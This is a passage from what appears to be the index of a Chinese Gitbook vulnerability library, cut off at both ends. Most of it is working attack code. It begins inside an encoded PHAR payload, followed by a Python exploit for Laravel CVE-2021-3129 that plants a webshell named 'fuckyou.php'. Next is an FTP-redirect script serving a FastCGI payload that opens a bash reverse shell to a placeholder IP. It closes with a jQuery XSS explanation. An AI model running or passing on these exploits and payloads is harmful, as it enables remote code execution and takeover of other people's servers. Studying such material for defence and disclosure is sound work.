0=77=00=59=00=56=00=63=00=35=00=64=00=55=00=6C=00=46=00=4F=00=47=00=39=00=4B=00=52=00=56=00=46=00=77=00=5A=00=54=00=4E=00=4B=00=62=00=47=00=52=00=49=00=56=00=6E=00=6C=00=69=00=61=00=55=00=4A=00=70=00=57=00=56=00=68=00=4F=00=62=00=45=00=35=00=71=00=55=00=6D=00=5A=00=61=00=52=00=31=00=5A=00=71=00=59=00=6A=00=4A=00=53=00=62=00=45=00=74=00=44=00=55=00=6B=00=56=00=4C=00=56=00=48=00=51=00=35=00=53=00=6B=00=5A=00=42=00=4F=00=55=00=6F=00=7A=00=51=00=6D=00=68=00=6A=00=4D=00=30=00=31=00=75=00=54=00=33=00=6C=00=53=00=56=00=31=00=42=00=54=00=5A=00=48=00=64=00=5A=00=57=00=47=00=78=00=7A=00=59=00=6A=00=4A=00=47=00=61=00=30=00=70=00=36=00=63=00=32=00=74=00=57=00=52=00=44=00=42=00=75=00=54=00=54=00=4A=00=4E=00=4D=00=6C=00=70=00=55=00=51=00=6D=00=6C=00=50=00=52=00=30=00=55=00=31=00=57=00=58=00=70=00=46=00=4D=00=55=00=31=00=71=00=53=00=54=00=42=00=5A=00=55=00=32=00=4D=00=33=00=59=00=56=00=64=00=5A=00=62=00=32=00=46=00=59=00=54=00=6E=00=70=00=61=00=57=00=46=00=46=00=76=00=53=00=6B=00=59=00=35=00=55=00=56=00=51=00=78=00=54=00=6C=00=56=00=58=00=65=00=56=00=4A=00=52=00=57=00=46=00=4E=00=72=00=63=00=47=00=56=00=35=00=55=00=6B=00=64=00=51=00=56=00=54=00=68=00=76=00=55=00=6C=00=4E=00=6F=00=55=00=45=00=74=00=44=00=55=00=6D=00=5A=00=56=00=52=00=54=00=6C=00=55=00=56=00=6B=00=5A=00=7A=00=61=00=31=00=56=00=47=00=4D=00=48=00=42=00=4D=00=51=00=31=00=4A=00=56=00=53=00=31=00=4E=00=72=00=4E=00=32=00=46=00=58=00=57=00=57=00=39=00=68=00=57=00=45=00=35=00=36=00=57=00=6C=00=68=00=52=00=62=00=30=00=70=00=47=00=4F=00=56=00=52=00=53=00=56=00=6B=00=35=00=55=00=55=00=31=00=55=00=35=00=54=00=31=00=64=00=35=00=55=00=6C=00=64=00=59=00=55=00=32=00=74=00=77=00=5A=00=58=00=6C=00=53=00=54=00=56=00=42=00=54=00=55=00=6D=00=5A=00=56=00=4D=00=46=00=5A=00=55=00=56=00=54=00=42=00=73=00=55=00=46=00=52=00=73=00=63=00=32=00=74=00=57=00=62=00=44=00=41=00=33=00=53=00=6B=00=56=00=46=00=4F=00=56=00=70=00=59=00=61=00=48=00=64=00=69=00=52=00=7A=00=6C=00=72=00=57=00=6C=00=4E=00=6E=00=62=00=6D=00=5A=00=44=00=59=00=33=00=4E=00=4B=00=52=00=58=00=64=00=77=00=54=00=7A=00=4A=00=4F=00=63=00=31=00=6C=00=59=00=54=00=6E=00=70=00=4A=00=52=00=55=00=34=00=33=00=59=00=30=00=68=00=57=00=61=00=57=00=4A=00=48=00=62=00=47=00=70=00=4A=00=52=00=31=00=6F=00=78=00=59=00=6D=00=31=00=4F=00=4D=00=47=00=46=00=58=00=4F=00=58=00=56=00=4A=00=52=00=7A=00=55=00=79=00=59=00=6A=00=4A=00=30=00=62=00=45=00=74=00=44=00=55=00=6E=00=64=00=4C=00=57=00=48=00=52=00=73=00=5A=00=47=00=31=00=47=00=63=00=30=00=74=00=44=00=55=00=6E=00=64=00=4D=00=61=00=55=00=6C=00=70=00=53=00=31=00=52=00=30=00=4F=00=57=00=5A=00=54=00=55=00=6C=00=4E=00=51=00=56=00=7A=00=56=00=73=00=5A=00=48=00=6C=00=43=00=52=00=45=00=74=00=44=00=61=00=7A=00=64=00=4B=00=52=00=6B=00=6C=00=30=00=55=00=47=00=30=00=31=00=4D=00=6D=00=49=00=79=00=64=00=47=00=78=00=4C=00=51=00=31=00=4A=00=43=00=56=00=33=00=6C=00=42=00=64=00=30=00=6C=00=47=00=4D=00=48=00=42=00=50=00=4D=00=6C=00=5A=00=71=00=59=00=55=00=63=00=34=00=5A=00=32=00=4D=00=7A=00=56=00=6D=00=6C=00=6A=00=4D=00=31=00=4A=00=35=00=53=00=30=00=63=00=78=00=61=00=30=00=35=00=54=00=5A=00=32=00=74=00=56=00=51=00=7A=00=52=00=72=00=56=00=6B=00=4E=00=72=00=63=00=30=00=6C=00=45=00=51=00=57=00=64=00=4D=00=51=00=30=00=46=00=34=00=54=00=6D=00=6C=00=42=00=63=00=45=00=38=00=79=00=56=00=6D=00=70=00=68=00=52=00=7A=00=68=00=6E=00=56=00=56=00=4E=00=6F=00=52=00=6B=00=74=00=46=00=51=00=6E=00=6C=00=6B=00=56=00=7A=00=52=00=76=00=53=00=6B=00=56=00=5A=00=63=00=45=00=78=00=44=00=55=00=6C=00=56=00=4C=00=55=00=32=00=73=00=33=00=57=00=6C=00=64=00=4F=00=62=00=32=00=4A=00=35=00=51=00=6E=00=70=00=6B=00=56=00=30=00=70=00=36=00=5A=00=45=00=68=00=4A=00=62=00=32=00=4A=00=58=00=55=00=54=00=46=00=4C=00=51=00=31=00=4A=00=52=00=54=00=47=00=6C=00=53=00=56=00=55=00=74=00=54=00=64=00=32=00=64=00=4E=00=56=00=46=00=6C=00=6E=00=53=00=31=00=52=00=30=00=4F=00=56=00=70=00=58=00=65=00=48=00=70=00=61=00=57=00=48=00=4E=00=72=00=57=00=44=00=46=00=4F=00=52=00=6C=00=55=00=78=00=54=00=6B=00=70=00=55=00=4D=00=44=00=56=00=69=00=53=00=6B=00=5A=00=61=00=5A=00=46=00=42=00=54=00=55=00=6B=00=64=00=50=00=4D=00=7A=00=45=00=35=00=49=00=48=00=77=00=67=00=59=00=6D=00=46=00=7A=00=5A=00=54=00=59=00=30=00=49=00=43=00=31=00=6B=00=49=00=44=00=34=00=75=00=4C=00=32=00=5A=00=31=00=59=00=32=00=74=00=35=00=62=00=33=00=55=00=75=00=63=00=47=00=68=00=77=00=49=00=6A=00=74=00=7A=00=4F=00=6A=00=55=00=36=00=49=00=6D=00=78=00=6C=00=64=00=6D=00=56=00=73=00=49=00=6A=00=74=00=4F=00=4F=00=33=00=31=00=39=00=63=00=7A=00=6F=00=34=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=73=00=5A=00=58=00=5A=00=6C=00=62=00=43=00=49=00=37=00=54=00=6A=00=74=00=7A=00=4F=00=6A=00=45=00=30=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=70=00=62=00=6D=00=6C=00=30=00=61=00=57=00=46=00=73=00=61=00=58=00=70=00=6C=00=5A=00=43=00=49=00=37=00=59=00=6A=00=6F=00=78=00=4F=00=33=00=4D=00=36=00=4D=00=54=00=51=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=6B=00=78=00=70=00=62=00=57=00=6C=00=30=00=49=00=6A=00=74=00=70=00=4F=00=69=00=30=00=78=00=4F=00=33=00=4D=00=36=00=4D=00=54=00=4D=00=36=00=49=00=67=00=41=00=71=00=41=00=48=00=42=00=79=00=62=00=32=00=4E=00=6C=00=63=00=33=00=4E=00=76=00=63=00=6E=00=4D=00=69=00=4F=00=32=00=45=00=36=00=4D=00=6A=00=70=00=37=00=61=00=54=00=6F=00=77=00=4F=00=33=00=4D=00=36=00=4E=00=7A=00=6F=00=69=00=59=00=33=00=56=00=79=00=63=00=6D=00=56=00=75=00=64=00=43=00=49=00=37=00=61=00=54=00=6F=00=78=00=4F=00=33=00=4D=00=36=00=4E=00=6A=00=6F=00=69=00=63=00=33=00=6C=00=7A=00=64=00=47=00=56=00=74=00=49=00=6A=00=74=00=39=00=66=00=58=00=4D=00=36=00=4D=00=54=00=4D=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=6C=00=4E=00=70=00=65=00=6D=00=55=00=69=00=4F=00=32=00=6B=00=36=00=4C=00=54=00=45=00=37=00=63=00=7A=00=6F=00=35=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=69=00=64=00=57=00=5A=00=6D=00=5A=00=58=00=49=00=69=00=4F=00=32=00=45=00=36=00=4D=00=54=00=70=00=37=00=61=00=54=00=6F=00=77=00=4F=00=32=00=45=00=36=00=4D=00=6A=00=70=00=37=00=61=00=54=00=6F=00=77=00=4F=00=33=00=4D=00=36=00=4F=00=44=00=41=00=77=00=4F=00=69=00=4A=00=6C=00=59=00=32=00=68=00=76=00=49=00=46=00=42=00=45=00=4F=00=58=00=64=00=68=00=53=00=45=00=46=00=6E=00=53=00=55=00=68=00=4F=00=62=00=47=00=4D=00=7A=00=54=00=6E=00=42=00=69=00=4D=00=6A=00=56=00=6D=00=59=00=7A=00=4E=00=53=00=61=00=47=00=4E=00=75=00=55=00=57=00=39=00=4C=00=56=00=48=00=52=00=42=00=59=00=7A=00=4A=00=57=00=4D=00=46=00=67=00=7A=00=55=00=6E=00=42=00=69=00=56=00=31=00=5A=00=6D=00=59=00=6B=00=64=00=73=00=64=00=47=00=46=00=59=00=55=00=57=00=39=00=4E=00=51=00=32=00=73=00=33=00=55=00=55=00=64=00=57=00=65=00=57=00=4E=00=74=00=4F=00=58=00=6C=00=59=00=4D=00=30=00=70=00=73=00=59=00=30=00=63=00=35=00=65=00=57=00=52=00=48=00=62=00=48=00=56=00=61=00=65=00=57=00=64=00=33=00=53=00=31=00=52=00=30=00=62=00=57=00=52=00=58=00=4E=00=57=00=70=00=6B=00=52=00=32=00=78=00=32=00=59=00=6D=00=6C=00=43=00=52=00=6B=00=74=00=44=00=55=00=6B=00=56=00=4D=00=51=00=31=00=4A=00=4D=00=53=00=31=00=68=00=30=00=62=00=57=00=49=00=7A=00=53=00=57=00=39=00=4B=00=52=00=32=00=73=00=35=00=53=00=55=00=52=00=42=00=5A=00=30=00=39=00=35=00=55=00=6E=00=42=00=51=00=53=00=45=00=34=00=77=00=59=00=32=00=31=00=34=00=62=00=47=00=4A=00=70=00=5A=00=32=00=74=00=53=00=51=00=32=00=73=00=33=00=53=00=6B=00=64=00=72=00=63=00=6B=00=74=00=35=00=62=00=44=00=64=00=4B=00=52=00=56=00=4A=00=69=00=53=00=6B=00=64=00=73=00=5A=00=46=00=42=00=54=00=55=00=6B=00=56=00=58=00=65=00=56=00=4A=00=77=00=57=00=46=00=59=00=30=00=61=00=31=00=4D=00=78=00=63=00=32=00=74=00=68=00=55=00=33=00=4E=00=6E=00=54=00=56=00=4E=00=42=00=62=00=55=00=6C=00=45=00=52=00=54=00=46=00=4A=00=52=00=6A=00=41=00=33=00=5A=00=6C=00=68=00=4B=00=62=00=47=00=52=00=49=00=56=00=6E=00=6C=00=69=00=61=00=56=00=4A=00=46=00=54=00=7A=00=4D=00=78=00=62=00=57=00=52=00=58=00=4E=00=57=00=70=00=6B=00=52=00=32=00=78=00=32=00=59=00=6D=00=6C=00=43=00=55=00=6B=00=74=00=44=00=55=00=6B=00=56=00=4C=00=57=00=48=00=52=00=35=00=57=00=6C=00=68=00=53=00=4D=00=57=00=4E=00=74=00=4E=00=47=00=64=00=5A=00=62=00=55=00=5A=00=36=00=57=00=6C=00=52=00=5A=00=4D=00=46=00=67=00=79=00=56=00=6E=00=56=00=5A=00=4D=00=6A=00=6C=00=72=00=57=00=6C=00=4E=00=6E=00=61=00=31=00=4A=00=44=00=61=00=7A=00=64=00=6D=00=56=00=31=00=6F=00=78=00=59=00=6D=00=31=00=4F=00=4D=00=47=00=46=00=58=00=4F=00=58=00=56=00=4A=00=52=00=54=00=68=00=76=00=53=00=6B=00=56=00=52=00=63=00=47=00=55=00=7A=00=53=00=6D=00=78=00=6B=00=53=00=46=00=5A=00=35=00=59=00=6D=00=6C=00=43=00=61=00=56=00=6C=00=59=00=54=00=6D=00=78=00=4F=00=61=00=6C=00=4A=00=6D=00=57=00=6B=00=64=00=57=00=61=00=6D=00=49=00=79=00=55=00=6D=00=78=00=4C=00=51=00=31=00=4A=00=46=00=53=00=31=00=52=00=30=00=4F=00=55=00=70=00=47=00=51=00=54=00=6C=00=4B=00=4D=00=30=00=4A=00=6F=00=59=00=7A=00=4E=00=4E=00=62=00=6B=00=39=00=35=00=55=00=6C=00=64=00=51=00=55=00=32=00=52=00=33=00=57=00=56=00=68=00=73=00=63=00=32=00=49=00=79=00=52=00=6D=00=74=00=4B=00=65=00=6E=00=4E=00=72=00=56=00=6B=00=51=00=77=00=62=00=6B=00=30=00=79=00=54=00=54=00=4A=00=61=00=56=00=45=00=4A=00=70=00=54=00=30=00=64=00=46=00=4E=00=56=00=6C=00=36=00=52=00=54=00=46=00=4E=00=61=00=6B=00=6B=00=77=00=57=00=56=00=4E=00=6A=00=4E=00=32=00=46=00=58=00=57=00=57=00=39=00=68=00=57=00=45=00=35=00=36=00=57=00=6C=00=68=00=52=00=62=00=30=00=70=00=47=00=4F=00=56=00=46=00=55=00=4D=00=55=00=35=00=56=00=56=00=33=00=6C=00=53=00=55=00=56=00=68=00=54=00=61=00=33=00=42=00=6C=00=65=00=56=00=4A=00=48=00=55=00=46=00=55=00=34=00=62=00=31=00=4A=00=54=00=61=00=46=00=42=00=4C=00=51=00=31=00=4A=00=6D=00=56=00=55=00=55=00=35=00=56=00=46=00=5A=00=47=00=63=00=32=00=74=00=56=00=52=00=6A=00=42=00=77=00=54=00=45=00=4E=00=53=00=56=00=55=00=74=00=54=00=61=00=7A=00=64=00=68=00=56=00=31=00=6C=00=76=00=59=00=56=00=68=00=4F=00=65=00=6C=00=70=00=59=00=55=00=57=00=39=00=4B=00=52=00=6A=00=6C=00=55=00=55=00=6C=00=5A=00=4F=00=56=00=46=00=4E=00=56=00=4F=00=55=00=39=00=58=00=65=00=56=00=4A=00=58=00=57=00=46=00=4E=00=72=00=63=00=47=00=56=00=35=00=55=00=6B=00=31=00=51=00=55=00=31=00=4A=00=6D=00=56=00=54=00=42=00=57=00=56=00=46=00=55=00=77=00=62=00=46=00=42=00=55=00=62=00=48=00=4E=00=72=00=56=00=6D=00=77=00=77=00=4E=00=30=00=70=00=46=00=52=00=54=00=6C=00=61=00=57=00=47=00=68=00=33=00=59=00=6B=00=63=00=35=00=61=00=31=00=70=00=54=00=5A=00=32=00=35=00=6D=00=51=00=32=00=4E=00=7A=00=53=00=6B=00=56=00=33=00=63=00=45=00=38=00=79=00=54=00=6E=00=4E=00=5A=00=57=00=45=00=35=00=36=00=53=00=55=00=56=00=4F=00=4E=00=32=00=4E=00=49=00=56=00=6D=00=6C=00=69=00=52=00=32=00=78=00=71=00=53=00=55=00=64=00=61=00=4D=00=57=00=4A=00=74=00=54=00=6A=00=42=00=68=00=56=00=7A=00=6C=00=31=00=53=00=55=00=63=00=31=00=4D=00=6D=00=49=00=79=00=64=00=47=00=78=00=4C=00=51=00=31=00=4A=00=33=00=53=00=31=00=68=00=30=00=62=00=47=00=52=00=74=00=52=00=6E=00=4E=00=4C=00=51=00=31=00=4A=00=33=00=54=00=47=00=6C=00=4A=00=61=00=55=00=74=00=55=00=64=00=44=00=6C=00=6D=00=55=00=31=00=4A=00=54=00=55=00=46=00=63=00=31=00=62=00=47=00=52=00=35=00=51=00=6B=00=52=00=4C=00=51=00=32=00=73=00=33=00=53=00=6B=00=5A=00=4A=00=64=00=46=00=42=00=74=00=4E=00=54=00=4A=00=69=00=4D=00=6E=00=52=00=73=00=53=00=30=00=4E=00=53=00=51=00=6C=00=64=00=35=00=51=00=58=00=64=00=4A=00=52=00=6A=00=42=00=77=00=54=00=7A=00=4A=00=57=00=61=00=6D=00=46=00=48=00=4F=00=47=00=64=00=6A=00=4D=00=31=00=5A=00=70=00=59=00=7A=00=4E=00=53=00=65=00=55=00=74=00=48=00=4D=00=57=00=74=00=4F=00=55=00=32=00=64=00=72=00=56=00=55=00=4D=00=30=00=61=00=31=00=5A=00=44=00=61=00=33=00=4E=00=4A=00=52=00=45=00=46=00=6E=00=54=00=45=00=4E=00=42=00=65=00=45=00=35=00=70=00=51=00=58=00=42=00=50=00=4D=00=6C=00=5A=00=71=00=59=00=55=00=63=00=34=00=5A=00=31=00=56=00=54=00=61=00=45=00=5A=00=4C=00=52=00=55=00=4A=00=35=00=5A=00=46=00=63=00=30=00=62=00=30=00=70=00=46=00=57=00=58=00=42=00=4D=00=51=00=31=00=4A=00=56=00=53=00=31=00=4E=00=72=00=4E=00=31=00=70=00=58=00=54=00=6D=00=39=00=69=00=65=00=55=00=4A=00=36=00=5A=00=46=00=64=00=4B=00=65=00=6D=00=52=00=49=00=53=00=57=00=39=00=69=00=56=00=31=00=45=00=78=00=53=00=30=00=4E=00=53=00=55=00=55=00=78=00=70=00=55=00=6C=00=56=00=4C=00=55=00=33=00=64=00=6E=00=54=00=56=00=52=00=5A=00=5A=00=30=00=74=00=55=00=64=00=44=00=6C=00=61=00=56=00=33=00=68=00=36=00=57=00=6C=00=68=00=7A=00=61=00=31=00=67=00=78=00=54=00=6B=00=5A=00=56=00=4D=00=55=00=35=00=4B=00=56=00=44=00=41=00=31=00=59=00=6B=00=70=00=47=00=57=00=6D=00=52=00=51=00=55=00=31=00=4A=00=48=00=54=00=7A=00=4D=00=78=00=4F=00=53=00=42=00=38=00=49=00=47=00=4A=00=68=00=63=00=32=00=55=00=32=00=4E=00=43=00=41=00=74=00=5A=00=43=00=41=00=2B=00=4C=00=69=00=39=00=6D=00=64=00=57=00=4E=00=72=00=65=00=57=00=39=00=31=00=4C=00=6E=00=42=00=6F=00=63=00=43=00=49=00=37=00=63=00=7A=00=6F=00=31=00=4F=00=69=00=4A=00=73=00=5A=00=58=00=5A=00=6C=00=62=00=43=00=49=00=37=00=54=00=6A=00=74=00=39=00=66=00=58=00=4D=00=36=00=4F=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=62=00=47=00=56=00=32=00=5A=00=57=00=77=00=69=00=4F=00=30=00=34=00=37=00=63=00=7A=00=6F=00=78=00=4E=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=61=00=57=00=35=00=70=00=64=00=47=00=6C=00=68=00=62=00=47=00=6C=00=36=00=5A=00=57=00=51=00=69=00=4F=00=32=00=49=00=36=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=45=00=30=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=69=00=64=00=57=00=5A=00=6D=00=5A=00=58=00=4A=00=4D=00=61=00=57=00=31=00=70=00=64=00=43=00=49=00=37=00=61=00=54=00=6F=00=74=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=45=00=7A=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=77=00=63=00=6D=00=39=00=6A=00=5A=00=58=00=4E=00=7A=00=62=00=33=00=4A=00=7A=00=49=00=6A=00=74=00=68=00=4F=00=6A=00=49=00=36=00=65=00=32=00=6B=00=36=00=4D=00=44=00=74=00=7A=00=4F=00=6A=00=63=00=36=00=49=00=6D=00=4E=00=31=00=63=00=6E=00=4A=00=6C=00=62=00=6E=00=51=00=69=00=4F=00=32=00=6B=00=36=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=59=00=36=00=49=00=6E=00=4E=00=35=00=63=00=33=00=52=00=6C=00=62=00=53=00=49=00=37=00=66=00=58=00=31=00=39=00=42=00=51=00=41=00=41=00=41=00=47=00=52=00=31=00=62=00=57=00=31=00=35=00=42=00=41=00=41=00=41=00=41=00=44=00=77=00=7A=00=43=00=6D=00=41=00=45=00=41=00=41=00=41=00=41=00=44=00=48=00=35=00=2F=00=32=00=4B=00=51=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=43=00=41=00=41=00=41=00=41=00=48=00=52=00=6C=00=63=00=33=00=51=00=75=00=64=00=48=00=68=00=30=00=42=00=41=00=41=00=41=00=41=00=44=00=77=00=7A=00=43=00=6D=00=41=00=45=00=41=00=41=00=41=00=41=00=44=00=48=00=35=00=2F=00=32=00=4B=00=51=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=64=00=47=00=56=00=7A=00=64=00=48=00=52=00=6C=00=63=00=33=00=53=00=6D=00=31=00=59=00=37=00=6B=00=34=00=32=00=72=00=2B=00=63=00=49=00=36=00=74=00=78=00=58=00=67=00=47=00=6A=00=36=00=46=00=66=00=4A=00=33=00=72=00=43=00=58=00=51=00=49=00=41=00=41=00=41=00=42=00=48=00=51=00=6B=00=31=00=43=00a\" } } req=requests.post(url,headers=header,data=json.dumps(data,indent=1)) return req def filterlog(url): data={ \"solution\": \"Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution\", \"parameters\": { \"variableName\": \"username\", \"viewFile\": \"php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log\" } } req=requests.post(url,headers=header,data=json.dumps(data,indent=1)) return req def phar(url,path): data={ \"solution\": \"Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution\", \"parameters\": { \"variableName\":\"username\", \"viewFile\": \"phar://\"+path+\"\\storage\\\\logs\\\\laravel.log\\\\test.txt\" } } req=requests.post(url,headers=header,data=json.dumps(data,indent=1)) return req def pharl(url,path): data={ \"solution\": \"Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution\", \"parameters\": { \"variableName\":\"username\", \"viewFile\": \"phar://\"+path+\"/storage/logs/laravel.log/test.txt\" } } req=requests.post(url,headers=header,data=json.dumps(data,indent=1)) return req def path(url): req=requests.get(url).text pattern = re.compile(r'(\\#\\d*\\ (.*)(?:\\/|\\\\)vendor)') m=pattern.findall(req) return m[0][1] if __name__=='__main__': print( ''' ██████ ▓█████ ▄████▄ ██▓███ ██▀███ ▒█████ ██████ ▒██ ▒ ▓█ ▀ ▒██▀ ▀█ ▓██░ ██▒▓██ ▒ ██▒▒██▒ ██▒▒██ ▒ ░ ▓██▄ ▒███ ▒▓█ ▄ ▓██░ ██▓▒▓██ ░▄█ ▒▒██░ ██▒░ ▓██▄ ▒ ██▒▒▓█ ▄ ▒▓▓▄ ▄██▒▒██▄█▓▒ ▒▒██▀▀█▄ ▒██ ██░ ▒ ██▒ ▒██████▒▒░▒████▒▒ ▓███▀ ░▒██▒ ░ ░░██▓ ▒██▒░ ████▓▒░▒██████▒▒ ▒ ▒▓▒ ▒ ░░░ ▒░ ░░ ░▒ ▒ ░▒▓▒░ ░ ░░ ▒▓ ░▒▓░░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░ ░ ░▒ ░ ░ ░ ░ ░ ░ ▒ ░▒ ░ ░▒ ░ ▒░ ░ ▒ ▒░ ░ ░▒ ░ ░ ░ ░ ░ ░ ░ ░░ ░░ ░ ░ ░ ░ ▒ ░ ░ ░ ░ ░ ░░ ░ ░ ░ ░ ░ ░ ''') url=sys.argv[1]+\"/_ignition/execute-solution\" clearlog(url) clearlog(url) clearlog(url) clearlog(url) clearlog(url) if(AA(url).status_code==500): if(\":\" in path(url)): print(\"windows\") if(sendpayloadwindows(url).status_code==500): if(filterlog(url).status_code==200): if(phar(url,path(url)).status_code==500): if(requests.get(sys.argv[1]+\"/fuckyou.php\").status_code==200): print(\"[+]webshell地址:\"+sys.argv[1]+\"/fuckyou.php,密码:pass\") else: print(\"[-]漏洞不存在\") if(\":\" not in path(url)): print(\"linux\") if(sendpayloadlinux(url).status_code==500): if(filterlog(url).status_code==200): if(pharl(url,path(url)).status_code==500): if(requests.get(sys.argv[1]+\"/fuckyou.php\").status_code==200): print(\"webshell地址:\"+sys.argv[1]+\"/fuckyou.php,密码:pass\") else: print(\"[-]漏洞不存在\") 根据路径密码使用哥斯拉连接木马 FTP脚本 # -*- coding: utf-8 -*- # @Time : 2021/1/13 6:56 下午 # @Author : tntaxin # @File : ftp_redirect.py # @Software: import socket from urllib.parse import unquote # 对gopherus生成的payload进行一次urldecode payload = unquote(\"%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%07%07%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH106%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%19SCRIPT_FILENAME/var/www/public/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00j%04%00%3C%3Fphp%20system%28%27bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/xxx.xxx.xxx.xxx/9999%200%3E%261%22%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00\") payload = payload.encode('utf-8') host = '0.0.0.0' port = 23 sk = socket.socket() sk.bind((host, port)) sk.listen(5) # ftp被动模式的passvie port,监听到1234 sk2 = socket.socket() sk2.bind((host, 1234)) sk2.listen() # 计数器，用于区分是第几次ftp连接 count = 1 while 1: conn, address = sk.accept() conn.send(b\"200 \\n\") print(conn.recv(20)) # USER aaa\\r\\n 客户端传来用户名 if count == 1: conn.send(b\"220 ready\\n\") else: conn.send(b\"200 ready\\n\") print(conn.recv(20)) # TYPE I\\r\\n 客户端告诉服务端以什么格式传输数据，TYPE I表示二进制， TYPE A表示文本 if count == 1: conn.send(b\"215 \\n\") else: conn.send(b\"200 \\n\") print(conn.recv(20)) # SIZE /123\\r\\n 客户端询问文件/123的大小 if count == 1: conn.send(b\"213 3 \\n\") else: conn.send(b\"300 \\n\") print(conn.recv(20)) # EPSV\\r\\n' conn.send(b\"200 \\n\") print(conn.recv(20)) # PASV\\r\\n 客户端告诉服务端进入被动连接模式 if count == 1: conn.send(b\"227 127,0,0,1,4,210\\n\") # 服务端告诉客户端需要到哪个ip:port去获取数据,ip,port都是用逗号隔开，其中端口的计算规则为：4*256+210=1234 else: conn.send(b\"227 127,0,0,1,35,40\\n\") # 端口计算规则：35*256+40=9000 print(conn.recv(20)) # 第一次连接会收到命令RETR /123\\r\\n，第二次连接会收到STOR /123\\r\\n if count == 1: conn.send(b\"125 \\n\") # 告诉客户端可以开始数据链接了 # 新建一个socket给服务端返回我们的payload print(\"建立连接!\") conn2, address2 = sk2.accept() conn2.send(payload) conn2.close() print(\"断开连接!\") else: conn.send(b\"150 \\n\") print(conn.recv(20)) exit() # 第一次连接是下载文件，需要告诉客户端下载已经结束 if count == 1: conn.send(b\"226 \\n\") conn.close() count += 1 参考文章 米斯特团队|漏洞分析 | Laravel Debug页面RCE（CVE-2021-3129）分析复现 陌陌安全|FTP利用|LARAVEL的那个RCE最有趣的点在这里 原作者漏洞分析 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/开发框架漏洞/jQuery/":{"url":"book/开发框架漏洞/jQuery/","title":"jQuery","keywords":"","body":"jQuery jQuery XSS漏洞 CVE-2020-11022/11023 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/开发框架漏洞/jQuery/jQuery XSS漏洞 CVE-2020-11022 11023.html":{"url":"book/开发框架漏洞/jQuery/jQuery XSS漏洞 CVE-2020-11022 11023.html","title":"jQuery XSS漏洞 CVE-2020-11022/11023","keywords":"","body":"jQuery XSS漏洞 CVE-2020-11022/11023 漏洞描述 据NVD描述：在大于或等于1.2且在3.5.0之前的jQuery版本中，即使执行了消毒（sanitize）处理，也仍会执行将来自不受信任来源的HTML传递给jQuery的DOM操作方法（即html()、.append()等），从而导致xss漏洞。 漏洞影响 [!NOTE] 3.5.0 > jQuery >= 1.2 漏洞复现 在线复现地址， 可以通过观察变化了解漏洞 https://vulnerabledoma.in/jquery_htmlPrefilter_xss.html PoC 1. PoC 2. (Only jQuery 3.x affected) \"> PoC 3. PoC 1和PoC 2具有相同的根本原因。在中.html()，作为参数传递的HTML字符串将传递到 $ .htmlPrefilter（）方法。该htmlPrefilter处理用于替换自闭合标签等进行到，通过使用以下正则表达式：**`` rxhtmlTag = / ] *）\\ /> / gi [。 ..] htmlPrefilter：function（html）{ return html.replace（rxhtmlTag，“ ”）; } 如果PoC 1的HTML通过此替换，则输出将是： > $ .htmlPrefilter（' '） “ 黄色部分是替换的字符串。由于此替换，样式元素内部被替换为，结果是，之后的字符串从样式元素中被踢出。之后，.html()将替换的HTML分配给innerHTML。在这里，字符串变成了实际的img标签，并触发了onerror事件。 顺便说一下，上述正则表达式在3.x之前的jQuery中使用。从3.x开始，使用了另一个经过稍加修改的正则表达式 rxhtmlTag = / \\ x20 \\ t \\ r \\ n \\ f] *）[^>] *）\\ /> / gi 此更改引入了另一个XSS向量，该向量可能仅由更多基本元素和属性导致XSS。通过此更改引入了PoC 2的向量。它仅适用于jQuery3.x。 > $ .htmlPrefilter（' ”>'） ”>“ 在这种情况下，属性值上的 img 字符串被踢出并发生XSS。 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/开发框架漏洞/PHPUnit/":{"url":"book/开发框架漏洞/PHPUnit/","title":"PHPUnit","keywords":"","body":"PHPUnit PHPUnit eval-stdin.php 远程命令执行漏洞 CVE-2017-9841 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/开发框架漏洞/PHPUnit/PHPUnit eval-stdin.php 远程命令执行漏洞 CVE-2017-9841.html":{"url":"book/开发框架漏洞/PHPUnit/PHPUnit eval-stdin.php 远程命令执行漏洞 CVE-2017-9841.html","title":"PHPUnit eval-stdin.php 远程命令执行漏洞 CVE-2017-9841","keywords":"","body":"PHPUnit eval-stdin.php 